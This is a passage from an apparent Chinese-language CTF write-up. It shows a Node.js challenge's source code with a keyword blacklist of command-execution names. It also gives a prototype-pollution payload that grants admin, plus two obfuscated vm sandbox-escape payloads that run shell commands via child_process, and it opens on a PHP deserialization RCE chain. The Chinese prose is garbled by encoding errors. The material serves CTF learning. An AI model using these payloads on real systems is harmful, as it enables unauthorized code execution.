<p>è¿™æ ·, åœ¨ååºåˆ—åŒ–æ—¶, é¦–å…ˆä¼šè°ƒç”¨ä¸¤ä¸ª Cache çš„ __wakeup æ–¹æ³•, å°†å„è‡ªçš„ expired è®¾ç½®ä¸º False<br>ç„¶åè°ƒç”¨ dataObject çš„ __destruct æ–¹æ³•, ä»è€Œè°ƒç”¨ Storage çš„ __set æ–¹æ³•<br>Storage é¦–å…ˆå°† store (å³ cache1 çš„ expired å±æ€§) åˆå§‹åŒ–ä¸ºä¸€ä¸ªç©ºæ•°ç»„, ç„¶åå­˜å…¥ cache1<br>æ­¤æ—¶, store ä¸ä¸ºç©º, é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ cache1 çš„ expired å±æ€§ä¸ä¸ºç©º<br>ç„¶åæ¥åˆ° cache2, storage çš„ __set æ–¹æ³•è°ƒç”¨å®ƒçš„ expired æ–¹æ³•, è¿›å…¥ if åˆ¤æ–­<br>å› ä¸ºæ­¤æ—¶ cache2 çš„ expired å­—æ®µ, ä¹Ÿå°±æ˜¯ä¸Šé¢çš„ store, å·²ç»è¢«è®¾ç½®æˆäº†ä¸€ä¸ªæ•°ç»„, å¹¶ä¸”æ•°ç»„ä¸­å­˜åœ¨ cache1 (ä¸ä¸ºç©º), å› æ­¤è¿™é‡Œ if è¡¨è¾¾å¼çš„ç»“æœä¸º True<br>æœ€åè¿›å…¥ helper çš„ clean æ–¹æ³•, æ‰§è¡Œ system(â€˜idâ€™); å®ç° RCE</p>
<h2 id="Week-2-ez-sandbox"><a href="#Week-2-ez-sandbox" class="headerlink" title="[Week 2] ez_sandbox"></a>[Week 2] ez_sandbox</h2><p>è€ƒç‚¹ï¼šJavaScript åŸå‹é“¾æ±¡æŸ“ç»•è¿‡ã€vm æ²™ç®±é€ƒé€¸</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">#app<span class="token punctuation">.</span>js



<span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span>

<span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">secret</span><span class="token operator">:</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token literal-property property">resave</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
    <span class="token literal-property property">saveUninitialized</span><span class="token operator">:</span> <span class="token boolean">true</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">var</span> users <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token keyword">var</span> admins <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">===</span> <span class="token string">'__proto__'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">continue</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> source <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> target
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">clone</span><span class="token punctuation">(</span><span class="token parameter">source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> source<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token parameter">code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'constructor'</span><span class="token punctuation">,</span> <span class="token string">'mainModule'</span><span class="token punctuation">,</span> <span class="token string">'require'</span><span class="token punctuation">,</span> <span class="token string">'child_process'</span><span class="token punctuation">,</span> <span class="token string">'process'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'execSync'</span><span class="token punctuation">,</span> <span class="token string">'execFile'</span><span class="token punctuation">,</span> <span class="token string">'execFileSync'</span><span class="token punctuation">,</span> <span class="token string">'spawn'</span><span class="token punctuation">,</span> <span class="token string">'spawnSync'</span><span class="token punctuation">,</span> <span class="token string">'fork'</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> v <span class="token keyword">of</span> blacklist<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>code<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>v <span class="token operator">+</span> <span class="token string">' is banned'</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">requireLogin</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">delete</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> requireLogin<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/public/index.html'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/public/login.html'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/public/register.html'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">clone</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token keyword">in</span> users <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token operator">=</span> username

        <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token keyword">in</span> admins<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>role <span class="token operator">=</span> <span class="token string">'admin'</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>role <span class="token operator">=</span> <span class="token string">'guest'</span>
        <span class="token punctuation">&#125;</span>

        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token string-property property">'message'</span><span class="token operator">:</span> <span class="token string">'login success'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token string-property property">'message'</span><span class="token operator">:</span> <span class="token string">'login failed'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">clone</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token keyword">in</span> users<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token string-property property">'message'</span><span class="token operator">:</span> <span class="token string">'register failed'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        users<span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">=</span> password
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token string-property property">'message'</span><span class="token operator">:</span> <span class="token string">'register success'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/profile'</span><span class="token punctuation">,</span> requireLogin<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token string-property property">'user'</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">,</span>
        <span class="token string-property property">'role'</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>role
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/sandbox'</span><span class="token punctuation">,</span> requireLogin<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>role <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> code <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>code
        <span class="token keyword">let</span> sandbox <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>
        <span class="token keyword">let</span> context <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">)</span>
        
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token function">waf</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>
            <span class="token keyword">let</span> result <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">runInContext</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> context<span class="token punctuation">)</span>
            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                <span class="token string-property property">'result'</span><span class="token operator">:</span> result
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                <span class="token string-property property">'result'</span><span class="token operator">:</span> e<span class="token punctuation">.</span>message
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token string-property property">'result'</span><span class="token operator">:</span> <span class="token string">'Your role is not admin, so you can not run any code'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">,</span> requireLogin<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server start listening on :3000'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">delete</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>åœ¨è¿™é‡Œæ¯ä¸€æ¬¡è¯·æ±‚éƒ½ä¼šåˆ é™¤prototypeå€¼</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">===</span> <span class="token string">'__proto__'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">continue</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> source <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> target
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å…¶å®çœ‹åˆ°è¿™å°±ä¼šæƒ³åˆ°æ˜¯åŸå‹é“¾æ±¡æŸ“ï¼Œ<code>__proto__</code>è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨<code>constructor.prototype</code>æ¥ç»•è¿‡è¿‡æ»¤<br>å…ˆæ³¨å†Œä¸€ä¸ª<code>test</code>ç”¨æˆ·, åœ¨ç™»å½•æ—¶ POST å¦‚ä¸‹å†…å®¹, æ±¡æŸ“<code>admins</code>å¯¹è±¡, ä½¿å¾—<code>username in admins</code>è¡¨è¾¾å¼çš„ç»“æœä¸º <code>True</code></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
    <span class="token string-property property">"username"</span><span class="token operator">:</span> <span class="token string">"test"</span><span class="token punctuation">,</span>
    <span class="token string-property property">"password"</span><span class="token operator">:</span> <span class="token string">"test"</span><span class="token punctuation">,</span>
    <span class="token string-property property">"constructor"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
        <span class="token string-property property">"prototype"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token string-property property">"test"</span><span class="token operator">:</span> <span class="token string">"123"</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/ba5c72a83e3441ba81966da664e63f15.png" alt="456"></p>
<p><img src="https://img-blog.csdnimg.cn/319fb067e4264030bd677e8afbdb914e.png" alt="1"></p>
<p>ç„¶åå°±æ˜¯vmæ²™ç®±é€ƒé€¸<br>å‚è€ƒé“¾æ¥<a href="https://xz.aliyun.com/t/11859#toc-4">æ²™ç®±é€ƒé€¸åˆè¯†</a></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//æ–¹æ³•ä¸€ï¼š</span>
<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
        <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">const</span> cc <span class="token operator">=</span> arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span>caller<span class="token punctuation">;</span>
            <span class="token keyword">const</span> p <span class="token operator">=</span> <span class="token punctuation">(</span>cc<span class="token punctuation">[</span><span class="token string">'constru'</span><span class="token operator">+</span><span class="token string">'ctor'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'constru'</span><span class="token operator">+</span><span class="token string">'ctor'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'return pro'</span><span class="token operator">+</span><span class="token string">'cess'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> p<span class="token punctuation">[</span><span class="token string">'mainM'</span><span class="token operator">+</span><span class="token string">'odule'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'requ'</span><span class="token operator">+</span><span class="token string">'ire'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'child_pr'</span><span class="token operator">+</span><span class="token string">'ocess'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'ex'</span><span class="token operator">+</span><span class="token string">'ecSync'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

<span class="token comment">//æ–¹æ³•äºŒï¼š</span>
<span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> 
obj<span class="token punctuation">.</span><span class="token function">__defineGetter__</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> c <span class="token operator">=</span> arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span>caller
    <span class="token keyword">const</span> p <span class="token operator">=</span> <span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token string">'constru'</span><span class="token operator">+</span><span class="token string">'ctor'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'constru'</span><span class="token operator">+</span><span class="token string">'ctor'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'return pro'</span><span class="token operator">+</span><span class="token string">'cess'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> p<span class="token punctuation">[</span><span class="token string">'mainM'</span><span class="token operator">+</span><span class="token string">'odule'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'requi'</span><span class="token operator">+</span><span class="token string">'re'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'child_pr'</span><span class="token operator">+</span><span class="token string">'ocess'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'ex'</span><span class="token operator">+</span><span class="token string">'ecSync'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">throw</span> obj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

